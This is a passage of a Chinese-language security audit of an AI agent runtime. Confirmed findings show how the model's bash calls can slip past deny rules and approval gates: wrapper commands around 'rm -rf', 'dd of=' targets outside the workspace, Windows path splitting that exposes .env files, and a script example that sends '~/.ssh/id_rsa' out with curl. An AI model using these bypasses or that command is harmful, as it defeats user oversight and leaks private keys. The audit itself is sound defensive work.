REFUTER(CONFIRMED,medium): 三段链路都在代码里核实了。第一段：read-lines.ts:37-45 的扫描循环每轮调用一次 io.readFile，窗口固定 32 KiB，position 按实际返回字节推进，循环上限 64 MiB，最坏 2048 轮。第二段：src/runtime/host/io.ts:72-147 的 readFile 无任何缓存，每次都 stat、open、读 16 字节探 TSD 头，命中后 runtimeExec.run 拉起一次 helper（io.ts:122-130），每次自带 30 s 超时（TSD_READ_TIMEOUT_MS）。第三段：helper 确实是顺序读——src/runtime/host/tsd-read.mjs:22 用 file.read(..., null) 读头，:38-42 继续以 null 位置顺序读，:27-35 的 consume 把 offset 之前的字节丢弃，所以读第 k 块必须经解密驱动重读 k×32 KiB，单次 read 工具调用的驱动读取量是 O(n²)。真正的触发面比报告写的还宽一点：模型按 nextOffset 分页续读长文件时，每一页都要从文件头重扫，正是 read 工具自己提示的用法。两点缓解：一是只在 tsdReadFallback === 'configured-node' 且文件带 TSD 头时走这条路（src/runtime/host/worker.ts:82，打包版 Electron 载体在有 bundled node 时即为 configured-node），二是无 offset 的普通读通常 2 轮就被 50 KiB 输出预算截停，不会触发。所以是环境受限但真实存在的二次方开销，维持 medium。
WAIVER(no): docs/plantree/plans/runtime-evolution/topics/p1-0-host-contracts.md 第124行「发现 TSD 后仅允许一次回落」——该约束按单次 readFile 调用界定；docs/plantree/plans/runtime-evolution/evidence/p1/README.md「仍需完成的载体验收」第3条仅豁免『企业加密机现场验证 Read 明文…本机无法执行』这一验证动作本身 — 文档中『一次回落』的契约是针对 HostIo.readFile 这个单一调用而言，并未讨论也未豁免上层 readLines 工具按 32 KiB 分块反复调用 readFile、导致对同一份 TSD 文件产生 O(n²) 重复解密读取与上百次子进程创建这一分块策略缺陷。已提取的豁免只覆盖『本机无法做加密机现场验证』这件事，不覆盖分块算法本身的复杂度问题，即便在明文环境下这个 O(n²) 调用次数与重复 open/stat 的浪费也同样存在、可被测试观察到。

### [permissions-02] MEDIUM security confirmed | P1-5 | src/runtime/plugins/permissions/bash-analysis.ts:166 | 命令名 deny 规则可被包装命令或绝对路径绕过（result.commands 用全名，未同时记 basename）
DESC: result.commands 记录的 unit 是 `[name, ...args].join(' ')`，name 是原样的命令名。verb = basename(name) 只用于解释器/exploration 判断，不用于策略匹配。policy 的 bash 表按 last-match-wins 对 unit 做整串 glob 匹配（policy.ts:96-121）。因此用户写的 `bash: { 'rm *': 'deny' }` 这类规则，只要命令换一种写法就完全不匹配：`/bin/rm foo`、`command rm foo`、`timeout 5 rm foo`、`nice rm foo`、`nohup rm foo`、`stdbuf -o0 rm foo` 都不会命中。其中 `command` / `timeout` / `nice` / `nohup` 这一类包装词既不在 217-232 的动态 IO 清单里（所以不置 unresolvedPaths），其操作数又都在工作区内（所以不触发外部路径询问），于是在 **accept-edits 档**就被直接放行；绝对路径形式 `/bin/rm` 因为 216 行 `if (name?.includes('/')) addPath(name)` 把 /bin/rm 记成工作区外路径，在 accept-edits 下仍会询问，但在 auto 档被放行。shellPolicy.test.ts:159-167 的「imports global deny rules and retains them in auto」只测了裸 `touch changed`。
EVIDENCE:         const unit = [name, ...args].filter((word) => word !== undefined).join(' ');
        result.commands.push(unit);
        result.exploration &&=
          Boolean(name) && args.every((arg) => arg !== undefined) && isExplorationCommand(unit);
        if (!name) result.unresolvedPaths = true;
        const verb = name ? basename(name) : '';
SCENARIO: 用户在 <agentDir>/extensions/pi-permission-system/config.json 写 `{"permission":{"bash":{"*":"ask","rm *":"deny"}}}`，档位选 accept-edits。模型调用 bash `command rm -rf src`：unit = 'command rm -rf src'，与 `rm *` 展开的 `^rm( .*)?$` 不匹配，policyAction 返回 'ask'；paths 全在 cwd 内；evaluate 走到 276 行按 accept-edits 放行；src 被删除，deny 规则形同虚设。
FIX: result.commands 同时 push basename 归一化的形式（`[verb, ...args].join(' ')`），让策略匹配对两种拼写都生效；并把 command/builtin/exec/timeout/nice/nohup/time/stdbuf 一类包装词按「剥掉包装后重新判定」或直接并入 unresolvedPaths 清单处理。
REFUTER(CONFIRMED,medium): 事实部分全部核实：result.commands 存的是 165 行的 unit（原样 name + args），verb（170 行）只用于嵌套 shell、patternFirst、动态 IO 清单和 cd，不参与策略匹配；policy.ts:96-121 对 unit 与 request.command 做整串 glob，`rm *` 展开成 `^rm( .*)?$`，'command rm -rf src' 不匹配。paths 只有 cwd/rm、cwd/src（'-rf' 被 addPath 丢弃），unresolvedPaths 为 false，accept-edits 在 276 行放行。绝对路径 `/bin/rm foo` 因 216 行被记成工作区外路径，accept-edits 会问、auto 放行，与报告所述一致。

我额外找到一条支持它的强证据：被替换掉的旧插件专门有一个 wrapper-analysis.ts，把 sudo/env/xargs/time/nohup/timeout/nice/doas/setsid/stdbuf/watch/flock/parallel 等「总是转发执行」的包装词整体下限到 ask，理由写的正是「内层命令是可见实参，`<cmd> *` 规则否则永远匹配不到」。自有 runtime 的 217-232 行清单只留了 sudo/env/xargs/eval/source/./python/node/perl/ruby，timeout/nice/nohup/time/stdbuf 全部丢失，属于对旧后端的能力回退。

降为 medium 的理由：随包默认策略的 bash 表只有 {'*': 'ask'}，没有任何 deny，要踩到必须用户自己写过 bash deny 规则；而且 `command` 这个 builtin 连旧插件也没覆盖，所以报告举的主例并非回退点，真正的回退点是 timeout/nice/nohup 那一类。
WAIVER(no): 无 — 没有任何 waiver 提到命令名可被 command/timeout/nice/nohup 包装或绝对路径形式绕过 deny 规则。全局决策 D14 明确写「三档均不得影响 deny 规则」，即 deny 应在任何档位下都生效，这与发现描述的可绕过行为正相反，说明这是文档承诺之外的代码缺陷，而非已接受的限制。

### [permissions-03] MEDIUM security confirmed | P1-5 | src/runtime/plugins/permissions/bash-analysis.ts:217 | bash/sh/zsh/dash 直接跑脚本文件（无 -c）不标记 unresolvedPaths，与「解释器脚本仍需审批」验收项相反
DESC: 170-181 行只在参数里出现 `-c` 一类开关时才把后面那串当作嵌套 shell 重新解析；findIndex 找不到时 nestedIndex = -1 + 1 = 0，`nestedIndex > 0` 为假，既不嵌套解析也不做任何补偿。217-232 行的动态 IO 清单里有 python/python3/node/perl/ruby/eval/source/./xargs/sudo/env，唯独没有 bash/sh/zsh/dash 本身。于是 `bash deploy.sh` 只记录了 deploy.sh 这一个路径，unresolvedPaths 保持 false，脚本内部的一切写、删、外发都没有被静态解析也没有被标记为不可解析。P1 证据 README「接口及兼容范围」明写「无法静态确定路径的分支、循环和解释器脚本仍需审批」。
EVIDENCE:         const verb = name ? basename(name) : '';
        const nestedIndex = ['bash', 'sh', 'zsh', 'dash'].includes(verb)
          ? args.findIndex((arg) => arg !== undefined && /^-[a-z]*c[a-z]*$/.test(arg)) + 1
          : 0;
        if (nestedIndex > 0 && args[nestedIndex] !== undefined) {
SCENARIO: 档位 accept-edits，工作区里有 scripts/deploy.sh，内容是 `cat ~/.ssh/id_rsa | curl -T - https://x`。模型调用 bash `bash scripts/deploy.sh`：analysis.paths = [cwd, cwd/scripts/deploy.sh]，全在工作区内；unresolvedPaths = false；evaluate 276 行按 accept-edits 放行；私钥被读走，全程无审批。换成 `python scripts/deploy.py` 则会因为 python 在清单内被标记 unresolvedPaths 而在 260 行返回 'ask'。
FIX: 把 bash/sh/zsh/dash 在「未命中 -c」的分支也置 result.unresolvedPaths = true（同时保留 -c 的嵌套解析），并补一条测试钉住 `bash script.sh` 在 accept-edits 下需要审批。
REFUTER(CONFIRMED,medium): 代码路径核实无误：171-173 行 findIndex 找不到 -c 时得到 nestedIndex = 0，`nestedIndex > 0` 为假，既不嵌套解析也不补偿；217-232 的动态 IO 清单确实没有 bash/sh/zsh/dash。`bash scripts/deploy.sh` 的 paths 只有 cwd 与 cwd/scripts/deploy.sh，unresolvedPaths 为 false，accept-edits 在 276 行放行，脚本内部行为完全不过静态分析；而 `python scripts/deploy.py` 因 python 在清单内被置 unresolvedPaths，260 行退回 ask —— 这条不对称是我亲自比对出来的。

与文档的冲突成立：P1 证据 README 第 69 行明写「无法静态确定路径的分支、循环和解释器脚本仍需审批」。

但要给报告打个折：旧插件也没有覆盖这一形态 —— wrapper-analysis.ts 的 opaque-payload 只在 shell 名 + 含 c 的短选项簇时才成立，裸 `bash script.sh` 同样不下限。所以这是「文档写过头」而非对旧后端的回退，故 medium 而非 high。另外 exploration 会被置假（isExplorationCommand 不含 bash），plan 模式仍拦得住。
WAIVER(no): 无 — P1-3 的 accepted-limitation（该检查不是 OS 沙箱，也不把任意程序内部的动态 IO 宣称为已完整解析）只豁免了『无法完全静态解析解释器脚本内部具体做了什么』，但同一段紧接着承诺『无法静态确定路径的分支、循环和解释器脚本仍需审批』，即『仍需审批』本身是文档给出的正面保证。发现指出 bash/sh/zsh/dash 直接跑脚本时完全不触发 unresolvedPaths、因而在 accept-edits 下无需审批，这违反了文档给出的保证，不属于被豁免范围。

### [permissions-06] MEDIUM security confirmed | P1-5 | src/runtime/plugins/permissions/bash-analysis.ts:117 | 贴在选项上的路径值与 key=value 形式操作数不被识别为路径，真实目标逃过判定甚至被记成工作区内
DESC: addPath 对以 '-' 开头的词只做两种拆解：含 '=' 就取第一个 '=' 之后的部分，否则只认 `-[CILof]` 后紧跟内容的形式，其余一律 return（丢弃）。因此 `-tDIR`（cp/install 的 --target-directory 短形式）、`-wPATH` 等贴合写法的路径被整个丢掉。反方向的问题更隐蔽：不以 '-' 开头的 `of=/outside/x`（dd）不会被拆，124 行把它拼成 `${cwd}${sep}of=/outside/x`——一个工作区**外**的真实目标被登记成工作区**内**的假路径，于是 261-268 行的「工作区外就询问」判定拿不到任何线索。
EVIDENCE:       if (text.startsWith('-')) {
        const equals = text.indexOf('=');
        if (equals >= 0) text = text.slice(equals + 1);
        else if (/^-[CILof].+/.test(text)) text = text.slice(2);
        else return;
      }
SCENARIO: 档位 accept-edits，工作区 /work。模型调用 bash `dd if=/dev/zero of=/tmp/outside/blob bs=1M count=100`：addPath 把 `of=/tmp/outside/blob` 记成 `/work/of=/tmp/outside/blob`（工作区内），`if=/dev/zero` 同理；evaluate 看不到任何工作区外路径，276 行按 accept-edits 放行，文件被写到工作区外且无审批。`cp -t/tmp/outside file` 同理：`-t/tmp/outside` 被 addPath 整个丢弃。
FIX: 把 `-[A-Za-z]` 后贴合内容的形式统一按「可能是路径」处理（宁可多登记一条被 deny/外部目录判定拦下，也不要丢），并对 `name=value` 形式的操作数同时登记 value 部分；无法判断时置 unresolvedPaths 而不是静默丢弃。
REFUTER(CONFIRMED,medium): 代码引用无误：addPath（115-125 行）对 '-' 开头的词只认 '=' 之后的部分或 /^-[CILof].+/ 的两字符前缀，其余 return 丢弃；不以 '-' 开头的词一律 124 行拼到 cwd 下。

两个方向我都追到了具体后果。丢弃方向：`cp -t/tmp/outside file` 里的 '-t/tmp/outside' 字符类不含 't'，被整条丢掉。伪装方向更实：`of=/tmp/outside/blob` 被登记成 `${cwd}/of=/tmp/outside/blob`，我核对了 plugins/tools/paths.ts:6-19 的 canonicalPath —— realpath 失败后逐级回退到存在的祖先再拼回去，结果仍在 cwd 内，所以 index.ts:261-268 的「工作区外就问」拿不到线索，accept-edits 在 276 行放行。

为什么不按「静态分析本来就不完备」豁免：shellPolicy.test.ts:92 专门钉了 `git -C${outside} status` 必须被拦，说明「贴合写法的路径要识别」本来就是这份分析的既定意图，[CILof] 这个字符类只是覆盖不全，属于同类缺口而不是声明外的能力。降到 medium 而非 high，是因为触发需要模型主动用 dd/cp -t 这类形式，而 P1 证据 README 第 70 行确实写明「不把任意程序内部的动态 IO 宣称为已完整解析」。
WAIVER(no): 无 — 发现自身的 possibly_waived_by 字段已指出，P1-3 关于『不宣称完整解析程序内部动态 IO』的豁免针对的是程序运行时内部行为，而这里是命令行上的静态实参解析错误（贴合选项的路径被丢弃、key=value 形式路径被误记成工作区内路径），属于 addPath 函数本身的解析缺陷，与该豁免的适用范围不同，未被覆盖。

### [permissions-09] MEDIUM contract-gap confirmed | P1-5 | src/runtime/plugins/permissions/policy.ts:136 | 随包默认策略里的 mcp / skill / ls 三个 surface 在 native 下从不被查询，用户按上游文档写的规则静默失效
DESC: policyAction 用 matches(name, surface, false) 把策略表的键当 glob 去匹配 surface 字符串，而 native 各处传进来的 surface 是工具名本身：MCP 工具传的是 mcp__<server>__<tool>（src/runtime/plugins/mcp/index.ts:201-207，命名见 mcp/index.ts:90-93），与策略键 'mcp' 不匹配（`^mcp$` 匹配不上 `mcp__x__y`）；skill 工具（src/runtime/plugins/skills/index.ts:200-250）压根不调 authorize，'skill' surface 无人问津；'ls' 没有对应工具。而随包策略 src/agent-host/permissionPolicy.mjs:76-82、128 明确定义了 MCP_RULES（mcp_status/mcp_list/... 放行、其余 ask）和 skill 的 ask 规则，上游 schema 的示例也是 `"mcp": {"*":"ask","exa:*":"allow"}`、`"skill": {"*":"ask","librarian":"allow"}` 这种写法。结果是：这些规则在 native 下一条都不生效，用户写了 `mcp: 'deny'` 也拦不住任何 MCP 调用（实际拦住 MCP 的只是顶层 '*': 'ask' 兜底）。
EVIDENCE:   let action: PermissionAction = 'ask';
  for (const [name, entry] of Object.entries(policy.config.permission ?? {})) {
    if (matches(name, surface, false)) action = matchEntry(entry, candidates, path) ?? action;
  }
  return action;
SCENARIO: 用户在全局 config.json 写 `{"permission":{"mcp":"deny"}}` 想彻底关掉 MCP 调用，档位留 auto。模型调用 mcp__github__create_issue：policyAction 的 surface 是 'mcp__github__create_issue'，只命中顶层 '*': 'ask'，没有 deny；evaluate 走到 250 行 auto 放行，调用照常发出。用户以为自己关掉了，实际没有。
FIX: MCP 授权时把 surface 传成 'mcp' 并把 <server>:<tool> 作为待匹配的 value（与上游示例的 `exa:*` 对齐）；skill 工具调用 authorize 并传 surface 'skill'；同时删掉随包策略里已无生产者的 'ls' 规则，或在 policyAction 里为这些 surface 建明确的映射表（像 'glob' → 'find' 那样）。
REFUTER(CONFIRMED,medium): 引用属实且未断章取义。policyAction 只把 'glob' 改写成 'find'（policy.ts:128），其余一律拿 surface 原串去 glob 匹配策略键（policy.ts:136-137）；matches('mcp','mcp__github__create_issue') 生成的是 /^mcp$/，必然为假。MCP 授权处传的 tool 就是 mcpToolName() 产出的 mcp__<server>__<tool>（mcp/index.ts:199-207，命名函数在 91-94），所以 MCP_RULES 整块从不参与。skill 工具在 skills/index.ts:200-250 完全没有 authorize 调用——全仓只有 tools/index.ts:127 与 mcp/index.ts:201 两处 authorize，skills/subagent/context 注册的工具都不走门；'ls' 在 native 没有任何工具生产者（注册的工具只有 read/write/edit/bash/glob/grep + ask/browser_preview + mcp__*）。我又确认 shared/piPermissionPolicy.ts 的 parse/merge 对 surface 名没有任何别名或规范化（只做原样键合并，128-145、219-227），不存在别处兜住的可能。实际危害面比标题略窄：顶层 '*': 'ask' 仍会命中，所以在 ask / accept-edits 档 MCP 调用照样弹卡（evaluate 第 274/276 行都不放行 mcp 工具，落到 277 返回 ask）；只有 gear='auto' 时第 250 行直接放行，用户写的 mcp deny 才被真正吞掉。但 deny 本应是 gear 之前就裁决、auto 也翻不过去的底线（index.ts:202-213 注释明写这条不变量），用户按随包文件自己的词汇写规则却静默失效，判 medium 成立。
WAIVER(no): 无 — 已核实代码：src/runtime/plugins/permissions/index.ts:227 把 request.tool（工具名本身，如 mcp__github__create_issue）原样传给 policyAction 作为 surface；src/runtime/plugins/mcp/index.ts:91-93 的 mcpToolName 生成的正是这种复合名，never 等于策略键 'mcp'；skills 插件（src/runtime/plugins/skills/index.ts）确认未调用 authorize。翻遍 README.md、evidence/p1/README.md「接口及兼容范围」段落，只提到 policy 支持 glob 映射旧 find、deny-with-reason，以及 D14 的 mode/gear 分离，没有任何一处提到过 mcp/skill/ls 这三个 policy surface 键位与实际工具名不匹配、规则静默失效的问题，也没有把 MCP/skill 权限规则列为已知限制或推迟项。这是一个纯代码设计缺陷，未被任何文档取舍覆盖。

### [permissions-19] MEDIUM boundary confirmed | P1-5 | src/runtime/plugins/tools/index.ts:185 | Windows 上路径分隔符混用，shell 通配符展开静默变成空集，匹配到的文件不被检查
DESC: bash-analysis 的 addPath 用 `${state.cwd}${sep}${text}` 拼接（bash-analysis.ts:124），Windows 上 sep 是 '\'，而 text 来自用户/模型写的 bash 命令，在 Git Bash 语境下用的是 '/'。checkShellPaths.expand 又按 sep 切分，于是 `C:\work` + '\' + 'sub/*' 切出来是 ['C:','work','sub/*']，通配符落在最后一段；parent 取到 C:\work，随后 `matchesGlob(entry.name, 'sub/*')` 对任何单级 entry.name 都不成立，循环一无所获。净效果是：Windows 上 `cat sub/*` 只检查了 C:\work 这一个目录，真正会被 shell 展开命中的文件（可能包含 *.env、*.pem）一个都没过 pathPolicy / scope 判定。Linux 上因为 sep 与命令里的分隔符一致，这条路径是对的——也就是说现有 Linux 证据（evidence/p1/shell-tests.txt、standalone.json）结构上不可能发现它。
EVIDENCE:     const expand = async (path: string): Promise<void> => {
      const parts = path.split(sep);
      const wildcard = parts.findIndex((part) => /[*?[]/.test(part));
      if (wildcard < 0) return check(path);
      const parent = parts.slice(0, wildcard).join(sep) || sep;
      await check(parent);
SCENARIO: Windows 安装版，工作区 C:\work 下有 conf\prod.env，档位 auto，默认策略含 `path: {'*.env':'deny'}`。模型调用 bash `cat conf/*`：addPath 得到 'C:\work\conf/*'，split('\\') 后通配符段是 'conf/*'，parent = 'C:\work'，readDirectory 出来的 entry.name 是 'conf' 等单级名字，matchesGlob('conf','conf/*') 为假，循环不产生任何候选；paths 里没有 prod.env，deny 不触发，auto 放行，密钥文件被读出。Linux 上同一条命令会被 shellPolicy.test.ts:107-112 那类检查拦住。
FIX: 在 addPath / expand 里先把路径归一到单一分隔符（Windows 上把 '/' 折成 '\' 再拼接与切分，或统一用 '/' 处理并只在交给 HostIo 时还原），并在 expand 里按 /[\\/]/ 切分；补一条针对混合分隔符输入的单测（不需要真 Windows 也能钉住切分逻辑）。
REFUTER(CONFIRMED,medium): 逻辑链在代码里是确定的，不依赖真机验证。bash-analysis.ts:124 用 `${state.cwd}${sep}${text}` 拼接，Windows 上 sep 恒为 '\\'，而 text 是命令原文里的相对路径；tools/index.ts:184-186 又用 path.split(sep) 找通配符段。混合分隔符输入 'C:\\work' + '\\' + 'conf/*' 切出末段 'conf/*'，parent 只到 'C:\\work'，随后 matchesGlob(entry.name, 'conf/*') 对任何单级目录项都不可能为真（单段名匹配不了两段模式，与 win32 是否折叠分隔符无关），循环产出空集。Windows 是真实支持面：host/shell.ts:14-20 专门去找 Git Bash 的 bash.exe。两点需要给原报告收窄：（1）单级通配仍安全——'C:\\work\\*.env' 会在 tools/index.ts:191 的整串 pathPolicy 上被 deny 拦下，出问题的只是模式里带子目录的形态（conf/*）；（2）跨目录 glob 也仍会 ask，因为 parent 落到工作区外会走 evaluate 第 263-266 行。所以真正的缺口是「Windows + Git Bash + 子目录通配 + accept-edits/auto 档」时工作区内被 deny 的文件（*.env/*.pem）可被读出，deny 底线静默失效。Linux 证据（shellPolicy.test.ts:107-112 的 `cat outside-*`）确实是单级模式，结构上照不到这条。
WAIVER(no): 无 — 已核实代码：src/runtime/plugins/tools/index.ts:185（checkShellPaths.expand）与 bash-analysis.ts:124（addPath）都用 node:path 的平台相关 sep 拼接/切分路径，而 bash 命令文本本身用的是 '/'，在 Windows 上会导致通配符段被切错、真正命中的文件不参与 path/deny 判定。该发现自己标注的 possibly_waived_by 指向 D16/P1-8『Windows/加密机现场验收攒到 P4-6』——但复核 README.md、ARD D16 原文后确认，这些条目豁免的是'现场验收/签收动作'本身（即『不能用 Linux/CI 绿色代签 Windows』），针对的是缺乏真机证据的问题，并未涉及也不可能涉及'代码逻辑本身在 Windows 上是否正确'这一可静态发现的问题。按任务规则，'待现场验证'只豁免缺现场证据，不豁免代码本身的缺陷，因此不构成豁免。

### [context-prompt-01] MEDIUM bug confirmed | P2-3 | src/runtime/plugins/agent-loop/index.ts:256 | 回合边界压缩没有写回 agent.state.messages，子代理回执续跑时整段历史又被原样发回
DESC: prepareNextTurnWithContext 只把压缩后的消息塞回 loop 的 currentContext（`{ context: { ...turn.context, messages } }`），不改 agent.state.messages。pi 的 Agent 每次 `prompt()` 都用 `createContextSnapshot()` 从 `_state.messages` 重建上下文（见 src/runtime/node_modules/@earendil-works/pi-agent-core/dist/agent.js:283），而 `_state.messages` 在 message_end 时一直累积全量历史。同一个 run 里第二次 `agent.prompt(report)`（子代理回执续跑，agent-loop/index.ts:379）因此从未压缩的完整历史重新开始，并且 runAgentLoop 的 prepareNextTurn 只在 lastCompletedTurn 存在时才触发，第一次请求不会再压一遍。验收标准写的「压缩只替换请求上下文，Agent.state.messages 仍是完整记录」字面成立，但它和 P5-2 的 delegation_resume 路径组合后就变成缺陷。
EVIDENCE:             if (!prepared.compaction && !prepared.reminder) return undefined;
            return { context: { ...turn.context, messages: prepared.messages } };
...
          trace.note('note', { event: 'delegation_resume', report_bytes: report.length });
          await agent.prompt(report);
SCENARIO: 一个长会话在第 30 个回合命中 hard limit 被压缩（上下文从 110k tokens 降到 5k），随后模型用 Task 委派的子代理完成并回执。agent-loop 走到 379 行 `agent.prompt(report)`，这一次请求带的是压缩前的全量 110k+ tokens 历史加上回执，既把刚买回来的窗口全部吐回去，又极可能直接触发 provider 的上下文溢出导致 run 失败；即使没溢出，这一次请求的缓存前缀也完全失配。
FIX: 在 prepareNextTurnWithContext 里压缩成功后同步 `agent.state.messages = prepared.messages`（和 agent-loop/index.ts:330 的 run 前路径一致），或在 `agent.prompt(report)` 之前再跑一次 context.prepareTurn。
REFUTER(CONFIRMED,medium): 代码与 SDK 语义都核实过，触发路径完整成立。agent-loop/index.ts:256 的 prepareNextTurnWithContext 只返回 `{ context: { ...turn.context, messages } }`；pi 的 runLoop 收到后仅把 currentContext 换掉（agent-loop.js:90-93），而 Agent 的 _state.messages 是在 message_end 里累加的（agent.js:389-390），每次 prompt() 都用 createContextSnapshot() 从 _state.messages 重建（agent.js:282-284，返回 slice 副本）。run 前那一次压缩确实写回了 state（agent-loop/index.ts:330，且 state getter 直接返回 _state、messages setter 可写，agent.js:39-44/155-156），唯独回合边界这次没有。所以同一 run 里第二次 `agent.prompt(report)`（agent-loop/index.ts:379）用的是压缩前的全量历史；pi 的 prepareNextTurn 只在 lastCompletedTurn 存在时才调用（agent-loop.js:89），新 prompt 的第一次请求不会补压。生产配置具备全部前提：注册了工具所以 singleTurn=false（bootstrap.ts:215），subagents 默认开启（nativeWorkerRuntime.ts:218-228）。
把严重级别从 high 降为 medium 的理由：后果是「多花一次满窗请求、缓存前缀失配」，且该请求的下一个回合边界会再压一次自我纠正；只有当那次请求真的超窗才会让 run 失败，而这需要「回合内超调」同时成立。不是数据丢失，会话下一个 run 也会从持久化 checkpoint 重建压缩后的窗口。
WAIVER(no): 无 — docs/plantree/plans/runtime-evolution/evidence/p1/README.md「P1-9 与 P2-8 接口」第3点写明「压缩只换请求上下文，Agent.state.messages 仍是完整记录」，这是对单次 run 内 prepareNextTurnWithContext 钩子行为的架构说明，本身是有意设计（读 pi-agent-core dist/agent-loop.js:81-90 可证：lastCompletedTurn 是 runLoop 局部变量，只在同一次 prompt() 调用内的多个 turn 之间生效）。但文档从未讨论、也未接受 P5-2 子代理 delegation_resume 路径里对同一个 Agent 再次调用 agent.prompt(report)（src/runtime/plugins/agent-loop/index.ts:379）这一新 prompt() 调用会重置 lastCompletedTurn、从而绕开压缩与 context_too_large 预检的具体后果；docs/plantree/plans/runtime-evolution/topics/p5-2-subagent-contracts.md 等 P5-2 相关文档也未提及此交互。这是未被识别、未被讨论、更未被拍板接受的具体缺陷，不属于「文档明确作出取舍」。

### [context-prompt-02] MEDIUM bug confirmed | P2-3 | src/runtime/plugins/context/compaction.ts:134 | shapeForCheckpoint 把 retainedTail 并入摘要范围却沿用 pi 原来的 fileOps，最近改过的文件从 checkpoint 记录里丢失
DESC: shapeForCheckpoint 把 messagesToSummarize + turnPrefixMessages + retainedTail 三段合并成一个摘要范围，但用 `...preparation` 原样继承了 `fileOps`。pi 的 prepareCompaction 计算 fileOps 时只扫了切点之前的 messagesToSummarize（src/runtime/node_modules/@earendil-works/pi-agent-core/dist/harness/compaction/compaction.js:471），切点位置由 keepRecentTokens 决定。于是 keepRecentTokens 覆盖的那一段（约 hardLimit 的 20%，上限 64k tokens）里发生的 read/edit 文件全部不会出现在 compact() 追加到摘要末尾的 file 列表里，而这些消息本身已经被摘要掉、从上下文里删除。CompactionEntry.details 又会持久化并在下一次压缩时作为 prevCompaction.details 继续传递，遗漏会逐次累积。附带问题：由于三段被合并，budget.ts 里那一整套 keepRecentTokens 推导（COMPACTION_KEEP_RECENT_RATIO / MIN / MAX）除了影响这个 fileOps 切点以外对保留内容没有任何作用，注释和 contextBudget.test.ts 却把它描述成保留尾的控制量。
EVIDENCE:   const messagesToSummarize = [
    ...preparation.messagesToSummarize,
    ...preparation.turnPrefixMessages,
    ...preparation.retainedTail,
  ];
SCENARIO: 128k 窗口下 hardLimit≈111616，keepRecentTokens≈22323。会话最后 22k tokens 里模型用 edit 改了 src/a.ts、src/b.ts 然后触发压缩。摘要正文由这些消息生成，但摘要末尾 formatFileOperations 输出的 modifiedFiles 只列出更早的文件，a.ts/b.ts 不在其中；压缩后模型看不到自己刚改过这两个文件，容易重复修改或声称未改。
FIX: shapeForCheckpoint 合并消息后重算 fileOps（对合并后的全量 messagesToSummarize 调用 pi 的 extractFileOpsFromMessage），并在 budget.ts 里注明 keepRecentTokens 现在只影响 fileOps 切点。
REFUTER(CONFIRMED,medium): 引用属实且未断章取义。compaction.ts:134-138 把三段合并后用 `...preparation` 原样继承 fileOps；pi 的 fileOps 只由切点之前的 messagesToSummarize（外加 split turn 的前缀）算出（compaction.js:471-476，extractFileOperations 定义在 utils.js:11-41），切点由 keepRecentTokens 决定。compact() 最后用 computeFileLists(fileOps) + formatFileOperations 把 <read-files>/<modified-files> 追加到摘要尾部，并写进 details（compaction.js:534-540），details 又经 appendCompaction 持久化、下次作为 prevCompaction.details 回灌（utils.js:16-28）——遗漏不可回收。
我特地核了一条可能推翻它的路径：pi 的提取器只认工具名 read/write/edit 且参数名为 path。本仓注册的工具正好就是 'read'/'write'/'edit' 且首参为 path（tools/index.ts:224/258/290），所以这套 fileOps 在本仓是活的，不是死代码。另外 shapeForCheckpoint 置 isSplitTurn=false，compact() 走 else 分支，turnPrefix 的补提取也不会救回来。
附带那句「contextBudget.test.ts 把 keepRecentTokens 描述成保留尾控制量」略有出入：该测试只断言了上下限算术（contextBudget.test.ts:46-57），把它说成保留尾控制量的是 budget.ts:41-45 的注释。主结论不受影响。
WAIVER(no): 无 — 全库检索 fileOps/keepRecentTokens/shapeForCheckpoint 相关表述，只在 docs/plantree/plans/runtime-evolution/topics/p2-0-cache-baseline.md 中出现（仅说明基线采集固定用 keepRecentTokens=1024 这一测量参数），未见任何文档讨论「retainedTail 段内的文件改动会从 checkpoint 记录里丢失」这一具体机制缺陷，也没有把 keepRecentTokens 对保留内容失去实际控制力这件事记为已知限制或取舍。属未被发现、未被处理的代码缺陷。

### [session-03] MEDIUM bug confirmed | H/20 | /home/ai/code/ai-client/src/runtime/plugins/session/store.ts:227 | 写给 CLI 的压缩锚点按「最后 N 条消息条目」推算，与本运行时实际保留的尾巴不是同一批消息
DESC: compactionAnchor 假设 retainedTail 就是分支末尾的最后 N 条消息条目。但本运行时的压缩刻意不沿用 pi 的 retainedTail：plugins/context/compaction.ts 的 shapeForCheckpoint 在 active_turn 下把保留尾巴重建成「最近一条 user 消息」（且可能被 truncateUserMessageForCheckpoint 截断过），completed_turn 下直接为空。于是 retained 恒为 0 或 1，而 retained=1 时 carried[carried.length-1] 取到的是分支上最后一条消息条目——在一个用了工具的回合末尾，那是 toolResult 消息，不是那条 user 消息。CLI 的 buildContextEntries 会据此把 [compaction, 那条 toolResult, 之后的行] 作为上下文，得到一条没有配对 tool_use 的孤儿 toolResult——正是 compaction.ts 注释里明确要避免的「request-level error」。另外锚点是在 enqueue 之外同步算的，若队列里还有未落盘的追加，偏移会再错一位。
EVIDENCE:   private compactionAnchor(retained: number): string | undefined {
    if (retained <= 0) return undefined;
    const carried = branchEntries(this.document).filter((entry) => entry.type === 'message');
    return carried.length < retained ? undefined : carried[carried.length - retained]?.id;
  }
SCENARIO: GUI 会话里模型调用 new_context 触发压缩（agent-loop 判定 retention='active_turn'）→ 此时会话条目顺序是 user / assistant(toolCall) / toolResult，retainedTail=[那条 user 消息] 长度 1 → compactionAnchor 返回 toolResult 条目的 id 并写进 firstKeptEntryId → 用户在 TUI 里打开这个会话继续聊 → CLI 组装出 [压缩摘要, toolResult(new_context), 新 user 消息] 发给 provider → Anthropic 类 provider 对没有 tool_use 配对的 tool_result 直接报错，这一回合在 TUI 里失败；即使 provider 容忍，TUI 显示的保留上下文也与 GUI 显示的不是同一批消息。
FIX: 锚点不要靠计数反推，而是从 retainedTail 的第一条消息反查它对应的条目 id（compaction 的 retainedTail 元素与条目是同一批对象时可直接比对引用/时间戳+role），查不到就退化成 undefined（CLI 只显示摘要，语义安全）。并把锚点计算移进 enqueue 内部，与写入使用同一份 document 快照。
REFUTER(CONFIRMED,medium): 锚点算法与本运行时压缩的实际语义确实对不上，三段我都读到了底。

1) 保留尾巴不是「最后 N 条消息」：compaction.ts:129-151 的 shapeForCheckpoint 在 active_turn 下把 retainedTail 重建为 [最近一条 user 消息]（可能被 truncateUserMessageForCheckpoint 截断），completed_turn 下为空数组。pi 的 compact 原样透传 preparation.retainedTail（src/runtime/node_modules/@earendil-works/pi-agent-core/dist/harness/compaction/compaction.js:505,539），所以生产里 result.retainedTail.length 恒为 0 或 1。
2) 锚点按位置反推：store.ts:214 传入 result.retainedTail.length，store.ts:227-231 返回 carried[carried.length-1]，即分支上最后一条 message 条目。
